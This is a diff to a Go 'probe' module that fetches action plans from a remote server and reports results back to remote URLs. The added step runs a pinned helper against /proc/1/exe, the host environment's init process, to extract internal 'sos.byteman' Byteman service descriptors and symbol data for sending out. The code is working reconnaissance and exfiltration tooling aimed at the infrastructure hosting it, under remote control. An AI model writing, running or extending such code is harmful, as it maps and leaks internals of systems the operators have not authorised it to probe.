@@ -35,21 +35,22 @@ var rpcServiceHost string
 var rpcDialAddress string
 
 const (
-	protocolVersion    = 1
-	moduleName         = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion       = "v0.0.38-codex"
-	targetRegistry     = "https://proxy.golang.org"
-	targetModuleName   = "github.com/benr00t3d/go-byteman-crosswrite-canary"
-	targetVersion      = "v0.0.1"
-	targetCanarySHA256 = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
-	downloadSource     = "robert-owned-v038-authority-cross-package-canary"
-	maximumResult      = 256 * 1024
-	maximumBody        = 256 * 1024
-	requestTimeout     = 20 * time.Second
-	resultTimeout      = 30 * time.Second
-	planPollWindow     = 30 * time.Minute
-	maximumPlanBody    = 4096
-	maximumPlanStep    = 12
+	protocolVersion        = 1
+	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
+	probeVersion           = "v0.0.39-codex"
+	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
+	targetRegistry         = "https://proxy.golang.org"
+	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
+	targetVersion          = "v0.0.1"
+	targetCanarySHA256     = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
+	downloadSource         = "robert-owned-v038-authority-cross-package-canary"
+	maximumResult          = 256 * 1024
+	maximumBody            = 256 * 1024
+	requestTimeout         = 20 * time.Second
+	resultTimeout          = 30 * time.Second
+	planPollWindow         = 30 * time.Minute
+	maximumPlanBody        = 4096
+	maximumPlanStep        = 12
 )
 
 var bucketNames = []string{
@@ -141,10 +142,11 @@ type planStep struct {
 }
 
 type inspectionResult struct {
-	Symbols      []string `json:"symbols,omitempty"`
-	DialWindow   []string `json:"dial_window,omitempty"`
-	CallerWindow []string `json:"caller_window,omitempty"`
-	Error        string   `json:"error,omitempty"`
+	Descriptors  []json.RawMessage `json:"descriptors,omitempty"`
+	Symbols      []string          `json:"symbols,omitempty"`
+	DialWindow   []string          `json:"dial_window,omitempty"`
+	CallerWindow []string          `json:"caller_window,omitempty"`
+	Error        string            `json:"error,omitempty"`
 }
 
 type probeReport struct {
@@ -190,7 +192,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v038-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v039-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -329,10 +331,9 @@ func cleanError(err error) string {
 
 func runCapslockSession(started time.Time, cwd string, identity identityResult) {
 	initial := newProbeReport(started, identity)
-	fillCapslockContext(&initial)
-	initial.Reason = "waiting for a bounded Byteman plan"
+	initial.Reason = "waiting for the bounded read-only descriptor plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v038-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v039-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -361,15 +362,13 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		switch step.Action {
 		case "finish":
 			report.Reason = "bounded plan finished"
-		case "inspect-session-dataflow":
-			runSessionDataflowInspection(&report)
-		case "probe-byteman":
-			runBytemanProbe(&report, step.RouteMode)
+		case "inspect-byteman-descriptors":
+			runBytemanDescriptorInspection(&report)
 		default:
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v038-codex-step-" + strconv.Itoa(cursor)
+		id := "v039-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -388,7 +387,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v038-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v039-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -444,11 +443,7 @@ func validatePlanStep(step planStep) error {
 		}
 	}
 	switch step.Action {
-	case "probe-byteman":
-		if !allowedRouteMode(step.RouteMode) {
-			return errors.New("plan route mode was not allowed")
-		}
-	case "inspect-session-dataflow", "finish":
+	case "inspect-byteman-descriptors", "finish":
 		if step.RouteMode != "" {
 			return errors.New("non-probe plan included route parameters")
 		}
@@ -629,8 +624,11 @@ func instructionWindow(data []byte, marker string, before, after int) []string {
 }
 
 func runSessionDataflowInspection(report *probeReport) {
-	result := &inspectionResult{}
-	report.Inspection = result
+	result := report.Inspection
+	if result == nil {
+		result = &inspectionResult{}
+		report.Inspection = result
+	}
 	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
 	if err != nil {
 		result.Error = cleanError(err)
@@ -662,6 +660,59 @@ func runSessionDataflowInspection(report *probeReport) {
 		return
 	}
 	report.Reason = "bounded static session dataflow inspection completed"
+}
+
+func runBytemanDescriptorInspection(report *probeReport) {
+	report.Inspection = &inspectionResult{}
+	helper := filepath.Join(report.Identity.CWD, "x86_64-gcc", "describe-protos")
+	helperData, err := os.ReadFile(helper)
+	if err != nil {
+		report.Inspection.Error = "descriptor helper was unavailable"
+		return
+	}
+	helperDigest := sha256.Sum256(helperData)
+	if hex.EncodeToString(helperDigest[:]) != descriptorHelperSHA256 {
+		report.Inspection.Error = "descriptor helper digest did not match the fixed build"
+		return
+	}
+	output, err := runFixedTool(helper, "/proc/1/exe", "sos.byteman")
+	if err != nil {
+		report.Inspection.Error = cleanError(err)
+		return
+	}
+	decoder := json.NewDecoder(bytes.NewReader(output))
+	for len(report.Inspection.Descriptors) < 8 {
+		var raw json.RawMessage
+		if err := decoder.Decode(&raw); err == io.EOF {
+			break
+		} else if err != nil {
+			report.Inspection.Error = "descriptor helper output was invalid JSON"
+			return
+		}
+		var envelope struct {
+			Package  string `json:"package"`
+			Services []struct {
+				Name string `json:"name"`
+			} `json:"services"`
+		}
+		if json.Unmarshal(raw, &envelope) != nil || envelope.Package != "sos.byteman" {
+			continue
+		}
+		for _, service := range envelope.Services {
+			if service.Name == "Byteman" {
+				report.Inspection.Descriptors = append(report.Inspection.Descriptors, append(json.RawMessage(nil), raw...))
+				break
+			}
+		}
+	}
+	if len(report.Inspection.Descriptors) != 1 {
+		report.Inspection.Error = "exactly one sos.byteman Byteman descriptor was not found"
+		return
+	}
+	runSessionDataflowInspection(report)
+	if report.Inspection.Error == "" {
+		report.Reason = "bounded Byteman descriptor and session dataflow inspection completed"
+	}
 }
 
 func inspectMetadata(client *http.Client) (metadataResult, string) {
